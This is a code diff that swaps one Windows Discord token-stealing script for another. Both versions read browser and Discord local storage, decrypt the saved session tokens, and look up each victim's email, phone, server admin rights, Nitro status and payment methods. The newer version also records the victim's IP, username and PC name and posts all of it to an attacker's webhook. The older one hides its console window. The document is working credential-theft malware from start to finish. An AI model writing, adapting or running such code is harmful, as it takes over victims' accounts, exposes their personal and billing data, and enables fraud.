@@ -1,228 +1,213 @@
 import os
-import re
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
 import json
+import urllib.request
+import re
 import base64
-import requests
+import datetime
+
+def install_import(modules):
+    for module, pip_name in modules:
+        try:
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
+
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
+
 import win32crypt
-from pathlib import Path
 from Crypto.Cipher import AES
-import time
 
-# FULL Discord Token Grabber with Decryption + User Info
-# Grabs from tons of browsers (Chromium-based + Firefox), decrypts tokens, fetches username, email, phone, etc.
-# Complete single-file script - nothing missing
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"  # <-- REPLACE WITH YOUR DISCORD WEBHOOK URL
-
-def get_master_key(local_state_path):
-    """Extract AES master key from Local State using Windows DPAPI"""
-    try:
-        with open(local_state_path, "r", encoding="utf-8") as f:
-            local_state = json.load(f)
-        if "os_crypt" not in local_state or "encrypted_key" not in local_state["os_crypt"]:
-            return None
-        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        return master_key
-    except Exception:
-        return None
-
-def decrypt_token(encrypted_token, master_key):
-    """Decrypt v10 AES-GCM encrypted token"""
-    try:
-        if encrypted_token.startswith(b'v10'):
-            nonce = encrypted_token[3:15]
-            ciphertext = encrypted_token[15:-16]
-            tag = encrypted_token[-16:]
-            cipher = AES.new(master_key, AES.MODE_GCM, nonce)
-            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
-            return decrypted.decode('utf-8')
-        return encrypted_token.decode('utf-8', errors='ignore')
-    except Exception:
-        return None
-
-def fetch_user_info(token):
-    """Fetch full user details from Discord API using the token"""
+def getheaders(token=None):
     headers = {
-        "Authorization": token,
-        "Content-Type": "application/json"
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
     }
-    try:
-        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=8)
-        if r.status_code == 200:
-            data = r.json()
-            return {
-                "id": data.get("id"),
-                "username": f"{data.get('username')}#{data.get('discriminator', '0')}" if data.get('discriminator') else data.get("username"),
-                "global_name": data.get("global_name"),
-                "email": data.get("email"),
-                "phone": data.get("phone"),
-                "verified": data.get("verified"),
-                "avatar": f"https://cdn.discordapp.com/avatars/{data.get('id')}/{data.get('avatar')}.png" if data.get("avatar") else None,
-                "mfa_enabled": data.get("mfa_enabled"),
-                "nitro": data.get("premium_type")
-            }
-        return None
-    except Exception:
-        return None
 
-def get_discord_tokens():
+    if token:
+        headers.update({"Authorization": token})
+
+    return headers
+
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
     tokens = []
-    token_pattern = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}')
 
-    # Extensive list of browser paths - exactly what you asked for, a lot more
-    browser_paths = [
-        # Google Chrome
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 2', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Profile 3', 'Local Storage', 'leveldb'),
-        # Microsoft Edge
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Profile 2', 'Local Storage', 'leveldb'),
-        # Brave
-        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Profile 1', 'Local Storage', 'leveldb'),
-        # Opera / Opera GX
-        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'),
-        # Vivaldi
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        # Yandex Browser
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        # Arc Browser
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Arc', 'User Data', 'Default', 'Local Storage', 'leveldb'),
-        # Discord native apps
-        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
-        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
-    ]
+    if not os.path.exists(path):
+        return tokens
 
-    # Scan all paths for raw tokens
-    for path in browser_paths:
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
-        try:
-            for file_path in list(Path(path).rglob('*.ldb')) + list(Path(path).rglob('*.log')):
-                try:
-                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                        content = f.read()
-                        matches = token_pattern.findall(content)
-                        for match in matches:
-                            if match not in tokens:
-                                tokens.append(match)
-                except Exception:
-                    pass
-        except Exception:
-            pass
 
-    # Decryption pass for encrypted v10 tokens
-    decryption_bases = [
-        os.path.join(os.getenv('APPDATA'), 'discord'),
-        os.path.join(os.getenv('APPDATA'), 'discordcanary'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default'),
-        os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
-        os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
-    ]
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
 
-    for base in decryption_bases:
-        local_state_path = os.path.join(base, 'Local State')
-        if os.path.exists(local_state_path):
-            master_key = get_master_key(local_state_path)
-            if master_key:
-                leveldb_path = os.path.join(base, 'Local Storage', 'leveldb')
-                if os.path.exists(leveldb_path):
-                    for file_path in list(Path(leveldb_path).rglob('*.ldb')) + list(Path(leveldb_path).rglob('*.log')):
-                        try:
-                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                                content = f.read()
-                                b64_matches = re.findall(r'([A-Za-z0-9+/=]{80,})', content)
-                                for b64_str in b64_matches:
-                                    try:
-                                        decoded = base64.b64decode(b64_str)
-                                        if decoded.startswith(b'v10'):
-                                            decrypted = decrypt_token(decoded, master_key)
-                                            if decrypted and re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27,}', decrypted):
-                                                if decrypted not in tokens:
-                                                    tokens.append(decrypted)
-                                    except Exception:
-                                        pass
-                        except Exception:
-                            pass
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
 
-    # Firefox fallback
-    try:
-        firefox_profile_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
-        if os.path.exists(firefox_profile_dir):
-            for profile in Path(firefox_profile_dir).iterdir():
-                if profile.is_dir():
-                    cookies_db = os.path.join(profile, 'cookies.sqlite')
-                    if os.path.exists(cookies_db):
-                        try:
-                            with open(cookies_db, 'r', encoding='utf-8', errors='ignore') as f:
-                                content = f.read()
-                                matches = token_pattern.findall(content)
-                                for match in matches:
-                                    if match not in tokens:
-                                        tokens.append(match)
-                        except Exception:
-                            pass
-    except Exception:
-        pass
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
 
-    return list(set(tokens))  # Remove duplicates
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
 
-def send_to_webhook(tokens):
-    if not tokens:
-        return
-    embeds = []
-    for token in tokens[:15]:  # Limit to avoid webhook spam
-        info = fetch_user_info(token)
-        if info:
-            embed = {
-                "title": "🎣 Discord Account Grabbed",
-                "color": 0x7289da,
-                "fields": [
-                    {"name": "Token", "value": f"`{token[:35]}...`", "inline": False},
-                    {"name": "Username", "value": info.get("username", "N/A"), "inline": True},
-                    {"name": "Global Name", "value": info.get("global_name", "N/A"), "inline": True},
-                    {"name": "Email", "value": info.get("email", "N/A"), "inline": True},
-                    {"name": "Phone", "value": info.get("phone", "N/A"), "inline": True},
-                    {"name": "Verified", "value": str(info.get("verified", "N/A")), "inline": True},
-                    {"name": "MFA Enabled", "value": str(info.get("mfa_enabled", "N/A")), "inline": True},
-                    {"name": "Nitro", "value": str(info.get("nitro", "N/A")), "inline": True},
-                    {"name": "User ID", "value": info.get("id", "N/A"), "inline": True},
-                ],
-                "thumbnail": {"url": info.get("avatar")} if info.get("avatar") else None,
-                "footer": {"text": f"Grabbed • {time.strftime('%Y-%m-%d %H:%M')}"}
-            }
-            embeds.append(embed)
-        else:
-            embeds.append({
-                "title": "🎣 Raw Token (API fetch failed)",
-                "color": 0xff5555,
-                "description": f"`{token[:35]}...`"
-            })
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
 
-    payload = {
-        "content": f"**✅ Found {len(tokens)} Discord token(s)**",
-        "embeds": embeds
-    }
-    try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=10)
-    except Exception:
-        pass
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('WEBHOOK_URL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
 
 if __name__ == "__main__":
-    print("Running grabber...")  # Optional visible feedback before hiding
-    tokens = get_discord_tokens()
-    send_to_webhook(tokens)
-    
-    # Hide console window completely
-    try:
-        import ctypes
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except Exception:
-        pass
+    main()
